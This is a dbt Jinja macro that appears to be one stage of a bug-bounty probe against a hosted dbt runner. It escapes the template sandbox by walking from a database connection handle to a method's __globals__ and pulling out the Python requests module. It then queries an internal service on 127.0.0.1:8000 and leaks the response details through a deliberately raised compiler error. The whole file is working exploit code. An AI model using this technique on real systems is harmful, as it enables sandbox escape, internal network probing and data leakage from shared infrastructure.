{% macro phase692_local_listener_identity() %}
  {% set query_result = adapter.add_query("select 1 as phase692_control", auto_begin=false) %}
  {% set rest = query_result[0].handle.rest %}
  {% set method_globals = rest._request_exec.__globals__ %}
  {% set requests_module = method_globals.get("requests") %}
  {% do log("PHASE692_STAGE_1_REQUESTS_REACHED", info=true) %}

  {#
    127.0.0.1:8000 was produced by the runner's own /proc/net/tcp table in
    Phase 691.  This single GET identifies only the listener root.  Redirects
    are disabled, no Snowflake token is attached, and no raw body is logged.
  #}
  {% set response = requests_module.get(
      "http://127.0.0.1:8000/",
      headers={"X-Bug-Bounty": "dhmhack", "X-Phase692-Probe": "listener-root"},
      timeout=5,
      allow_redirects=false
  ) %}
  {% do log("PHASE692_STAGE_2_ROOT_RESPONSE", info=true) %}

  {% set response_headers = response.headers %}
  {% set content_type = response_headers.get("Content-Type", "") | lower %}
  {% set server = response_headers.get("Server", "") | lower %}
  {% set body = response.text | lower %}
  {% set header_names = response_headers.keys() | list | sort %}

  {{ exceptions.raise_compiler_error(
      "PHASE692_LOCAL_LISTENER"
      ~ "|STATUS=" ~ response.status_code
      ~ "|BODY_LENGTH=" ~ (body | length)
      ~ "|CONTENT_JSON=" ~ ("json" in content_type)
      ~ "|CONTENT_HTML=" ~ ("html" in content_type)
      ~ "|CONTENT_TEXT=" ~ ("text" in content_type)
      ~ "|SERVER_UVICORN=" ~ ("uvicorn" in server)
      ~ "|SERVER_GUNICORN=" ~ ("gunicorn" in server)
      ~ "|HEADER_LOCATION=" ~ (response_headers.get("Location") is not none)
      ~ "|HEADER_AUTH_CHALLENGE=" ~ (response_headers.get("WWW-Authenticate") is not none)
      ~ "|BODY_NOT_FOUND=" ~ ("not found" in body)
      ~ "|BODY_FASTAPI=" ~ ("fastapi" in body)
      ~ "|BODY_OPENAPI=" ~ ("openapi" in body)
      ~ "|BODY_UNAUTHORIZED=" ~ ("unauthorized" in body)
      ~ "|BODY_FORBIDDEN=" ~ ("forbidden" in body)
      ~ "|HEADER_NAMES=" ~ (header_names | join(","))
  ) }}
{% endmacro %}
